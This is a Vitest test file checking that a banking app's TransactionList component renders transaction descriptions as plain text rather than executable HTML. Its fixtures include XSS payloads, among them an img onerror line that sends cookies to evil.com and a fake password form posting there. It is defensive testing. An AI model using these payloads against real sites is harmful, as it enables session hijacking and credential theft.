import { describe, it, expect, vi, beforeEach } from 'vitest';
import { render, screen } from '@testing-library/react';
import React from 'react';

/**
 * SEC-303: XSS Vulnerability Tests
 *
 * These tests verify that transaction descriptions are properly escaped
 * and cannot execute malicious scripts (XSS attacks).
 *
 * Current vulnerability: components/TransactionList.tsx:71 uses dangerouslySetInnerHTML
 * Fix: Remove dangerouslySetInnerHTML and render description as plain text
 *
 * EXPECTED: These tests will FAIL until the fix is applied
 */

// Mock the tRPC client BEFORE importing the component
vi.mock('@/lib/trpc/client', () => ({
  trpc: {
    account: {
      getTransactions: {
        useQuery: vi.fn(),
      },
    },
  },
}));

import { trpc } from '@/lib/trpc/client';
import { TransactionList } from '@/components/TransactionList';

describe('SEC-303: XSS Vulnerability in Transaction Descriptions', () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  describe('Script Tag Injection', () => {
    it('should NOT render executable script tags in transaction descriptions', () => {
      const mockUseQuery = vi.mocked(trpc.account.getTransactions.useQuery);
      mockUseQuery.mockReturnValue({
        data: [{
          id: 1,
          accountId: 1,
          type: 'deposit' as const,
          amount: 100,
          description: '<script>alert("XSS")</script>',
          status: 'completed' as const,
          createdAt: '2025-01-15T10:00:00Z',
          processedAt: '2025-01-15T10:00:00Z',
        }],
        isLoading: false,
      } as any);

      const { container } = render(React.createElement(TransactionList, { accountId: 1 }));

      // The malicious script should be visible as plain text, not executed
      expect(screen.getByText('<script>alert("XSS")</script>')).toBeInTheDocument();

      // Verify no actual script tag exists in the DOM
      const scriptTags = container.querySelectorAll('script');
      expect(scriptTags.length).toBe(0);
    });
  });

  describe('HTML Tag Injection', () => {
    it('should NOT render img tags with onerror handlers', () => {
      const mockUseQuery = vi.mocked(trpc.account.getTransactions.useQuery);
      mockUseQuery.mockReturnValue({
        data: [{
          id: 1,
          accountId: 1,
          type: 'deposit' as const,
          amount: 100,
          description: '<img src=x onerror="alert(\'XSS\')">',
          status: 'completed' as const,
          createdAt: '2025-01-15T10:00:00Z',
          processedAt: '2025-01-15T10:00:00Z',
        }],
        isLoading: false,
      } as any);

      const { container } = render(React.createElement(TransactionList, { accountId: 1 }));

      // The malicious HTML should be visible as plain text
      expect(screen.getByText('<img src=x onerror="alert(\'XSS\')">')).toBeInTheDocument();

      // Verify no img tag with onerror exists
      const imgWithOnerror = container.querySelectorAll('img[onerror]');
      expect(imgWithOnerror.length).toBe(0);
    });

    it('should NOT render iframe tags', () => {
      const mockUseQuery = vi.mocked(trpc.account.getTransactions.useQuery);
      mockUseQuery.mockReturnValue({
        data: [{
          id: 1,
          accountId: 1,
          type: 'deposit' as const,
          amount: 100,
          description: '<iframe src="javascript:alert(\'XSS\')"></iframe>',
          status: 'completed' as const,
          createdAt: '2025-01-15T10:00:00Z',
          processedAt: '2025-01-15T10:00:00Z',
        }],
        isLoading: false,
      } as any);

      const { container } = render(React.createElement(TransactionList, { accountId: 1 }));

      // The malicious HTML should be visible as plain text
      expect(screen.getByText('<iframe src="javascript:alert(\'XSS\')"></iframe>')).toBeInTheDocument();

      // Verify no iframe exists
      const iframes = container.querySelectorAll('iframe');
      expect(iframes.length).toBe(0);
    });

    it('should NOT render svg tags with onload handlers', () => {
      const mockUseQuery = vi.mocked(trpc.account.getTransactions.useQuery);
      mockUseQuery.mockReturnValue({
        data: [{
          id: 1,
          accountId: 1,
          type: 'deposit' as const,
          amount: 100,
          description: '<svg onload="alert(\'XSS\')">',
          status: 'completed' as const,
          createdAt: '2025-01-15T10:00:00Z',
          processedAt: '2025-01-15T10:00:00Z',
        }],
        isLoading: false,
      } as any);

      const { container } = render(React.createElement(TransactionList, { accountId: 1 }));

      // The malicious HTML should be visible as plain text
      expect(screen.getByText('<svg onload="alert(\'XSS\')">')).toBeInTheDocument();

      // Verify no svg with onload exists
      const svgWithOnload = container.querySelectorAll('svg[onload]');
      expect(svgWithOnload.length).toBe(0);
    });
  });

  describe('Event Handler Injection', () => {
    it('should NOT render elements with onclick handlers', () => {
      const mockUseQuery = vi.mocked(trpc.account.getTransactions.useQuery);
      mockUseQuery.mockReturnValue({
        data: [{
          id: 1,
          accountId: 1,
          type: 'deposit' as const,
          amount: 100,
          description: '<div onclick="alert(\'XSS\')">Click me</div>',
          status: 'completed' as const,
          createdAt: '2025-01-15T10:00:00Z',
          processedAt: '2025-01-15T10:00:00Z',
        }],
        isLoading: false,
      } as any);

      const { container } = render(React.createElement(TransactionList, { accountId: 1 }));

      // The malicious HTML should be visible as plain text
      expect(screen.getByText('<div onclick="alert(\'XSS\')">Click me</div>')).toBeInTheDocument();

      // Verify no elements with onclick in the transaction table body
      const tbody = container.querySelector('tbody');
      const elementsWithOnclick = tbody?.querySelectorAll('[onclick]');
      expect(elementsWithOnclick?.length || 0).toBe(0);
    });

    it('should NOT render anchor tags with javascript: protocol', () => {
      const mockUseQuery = vi.mocked(trpc.account.getTransactions.useQuery);
      mockUseQuery.mockReturnValue({
        data: [{
          id: 1,
          accountId: 1,
          type: 'deposit' as const,
          amount: 100,
          description: '<a href="javascript:alert(\'XSS\')">Click</a>',
          status: 'completed' as const,
          createdAt: '2025-01-15T10:00:00Z',
          processedAt: '2025-01-15T10:00:00Z',
        }],
        isLoading: false,
      } as any);

      const { container } = render(React.createElement(TransactionList, { accountId: 1 }));

      // The malicious HTML should be visible as plain text
      expect(screen.getByText('<a href="javascript:alert(\'XSS\')">Click</a>')).toBeInTheDocument();

      // Verify no anchor with javascript: protocol
      const tbody = container.querySelector('tbody');
      const jsLinks = tbody?.querySelectorAll('a[href^="javascript:"]');
      expect(jsLinks?.length || 0).toBe(0);
    });
  });

  describe('Multiple XSS Vectors', () => {
    it('should safely render multiple transactions with various XSS attempts', () => {
      const mockUseQuery = vi.mocked(trpc.account.getTransactions.useQuery);
      mockUseQuery.mockReturnValue({
        data: [
          {
            id: 1,
            accountId: 1,
            type: 'deposit' as const,
            amount: 100,
            description: '<script>alert("XSS")</script>',
            status: 'completed' as const,
            createdAt: '2025-01-15T10:00:00Z',
            processedAt: '2025-01-15T10:00:00Z',
          },
          {
            id: 2,
            accountId: 1,
            type: 'deposit' as const,
            amount: 50,
            description: '<img src=x onerror="alert(\'XSS\')">',
            status: 'completed' as const,
            createdAt: '2025-01-15T11:00:00Z',
            processedAt: '2025-01-15T11:00:00Z',
          },
          {
            id: 3,
            accountId: 1,
            type: 'deposit' as const,
            amount: 75,
            description: '<iframe src="javascript:alert(\'XSS\')"></iframe>',
            status: 'completed' as const,
            createdAt: '2025-01-15T12:00:00Z',
            processedAt: '2025-01-15T12:00:00Z',
          },
        ],
        isLoading: false,
      } as any);

      const { container } = render(React.createElement(TransactionList, { accountId: 1 }));

      // All malicious strings should be visible as text
      expect(screen.getByText('<script>alert("XSS")</script>')).toBeInTheDocument();
      expect(screen.getByText('<img src=x onerror="alert(\'XSS\')">')).toBeInTheDocument();
      expect(screen.getByText('<iframe src="javascript:alert(\'XSS\')"></iframe>')).toBeInTheDocument();

      // Verify no malicious elements exist
      expect(container.querySelectorAll('script').length).toBe(0);
      expect(container.querySelectorAll('iframe').length).toBe(0);
      expect(container.querySelectorAll('img[onerror]').length).toBe(0);
    });
  });

  describe('Safe Content Rendering', () => {
    it('should properly render legitimate transaction descriptions', () => {
      const mockUseQuery = vi.mocked(trpc.account.getTransactions.useQuery);
      mockUseQuery.mockReturnValue({
        data: [
          {
            id: 1,
            accountId: 1,
            type: 'deposit' as const,
            amount: 100,
            description: 'Funding from card',
            status: 'completed' as const,
            createdAt: '2025-01-15T10:00:00Z',
            processedAt: '2025-01-15T10:00:00Z',
          },
          {
            id: 2,
            accountId: 1,
            type: 'withdrawal' as const,
            amount: 50,
            description: 'ATM Withdrawal - Main St Branch',
            status: 'completed' as const,
            createdAt: '2025-01-15T11:00:00Z',
            processedAt: '2025-01-15T11:00:00Z',
          },
        ],
        isLoading: false,
      } as any);

      render(React.createElement(TransactionList, { accountId: 1 }));

      expect(screen.getByText('Funding from card')).toBeInTheDocument();
      expect(screen.getByText('ATM Withdrawal - Main St Branch')).toBeInTheDocument();
    });

    it('should handle null/empty descriptions gracefully', () => {
      const mockUseQuery = vi.mocked(trpc.account.getTransactions.useQuery);
      mockUseQuery.mockReturnValue({
        data: [
          {
            id: 1,
            accountId: 1,
            type: 'deposit' as const,
            amount: 100,
            description: null,
            status: 'completed' as const,
            createdAt: '2025-01-15T10:00:00Z',
            processedAt: '2025-01-15T10:00:00Z',
          },
          {
            id: 2,
            accountId: 1,
            type: 'deposit' as const,
            amount: 50,
            description: '',
            status: 'completed' as const,
            createdAt: '2025-01-15T11:00:00Z',
            processedAt: '2025-01-15T11:00:00Z',
          },
        ],
        isLoading: false,
      } as any);

      render(React.createElement(TransactionList, { accountId: 1 }));

      // Should show "-" for null/empty descriptions
      const cells = screen.getAllByText('-');
      // At least 2 "-" should exist for the two descriptions
      expect(cells.length).toBeGreaterThanOrEqual(2);
    });
  });

  describe('Advanced XSS Attack Prevention', () => {
    it('should prevent session hijacking via cookie stealing', () => {
      const mockUseQuery = vi.mocked(trpc.account.getTransactions.useQuery);
      mockUseQuery.mockReturnValue({
        data: [{
          id: 1,
          accountId: 1,
          type: 'deposit' as const,
          amount: 100,
          description: '<img src=x onerror="fetch(\'http://evil.com?c=\'+document.cookie)">',
          status: 'completed' as const,
          createdAt: '2025-01-15T10:00:00Z',
          processedAt: '2025-01-15T10:00:00Z',
        }],
        isLoading: false,
      } as any);

      const { container } = render(React.createElement(TransactionList, { accountId: 1 }));

      // Should be rendered as text
      const text = container.textContent || '';
      expect(text).toContain('img src=x');

      // No img with onerror should exist
      expect(container.querySelectorAll('img[onerror]').length).toBe(0);
    });

    it('should prevent DOM manipulation attacks', () => {
      const mockUseQuery = vi.mocked(trpc.account.getTransactions.useQuery);
      mockUseQuery.mockReturnValue({
        data: [{
          id: 1,
          accountId: 1,
          type: 'deposit' as const,
          amount: 100,
          description: '<script>document.querySelector(".balance").innerHTML="$0.00"</script>',
          status: 'completed' as const,
          createdAt: '2025-01-15T10:00:00Z',
          processedAt: '2025-01-15T10:00:00Z',
        }],
        isLoading: false,
      } as any);

      const { container } = render(React.createElement(TransactionList, { accountId: 1 }));

      // Should be rendered as text
      const text = container.textContent || '';
      expect(text).toContain('script');

      // No script tag should exist
      expect(container.querySelectorAll('script').length).toBe(0);
    });

    it('should prevent phishing via fake forms', () => {
      const mockUseQuery = vi.mocked(trpc.account.getTransactions.useQuery);
      mockUseQuery.mockReturnValue({
        data: [{
          id: 1,
          accountId: 1,
          type: 'deposit' as const,
          amount: 100,
          description: '<form action="http://evil.com"><input name="password" placeholder="Re-enter password"></form>',
          status: 'completed' as const,
          createdAt: '2025-01-15T10:00:00Z',
          processedAt: '2025-01-15T10:00:00Z',
        }],
        isLoading: false,
      } as any);

      const { container } = render(React.createElement(TransactionList, { accountId: 1 }));

      // Should be rendered as text
      const text = container.textContent || '';
      expect(text).toContain('form action');

      // No form should exist in tbody
      const tbody = container.querySelector('tbody');
      expect(tbody?.querySelectorAll('form').length || 0).toBe(0);
    });
  });
});
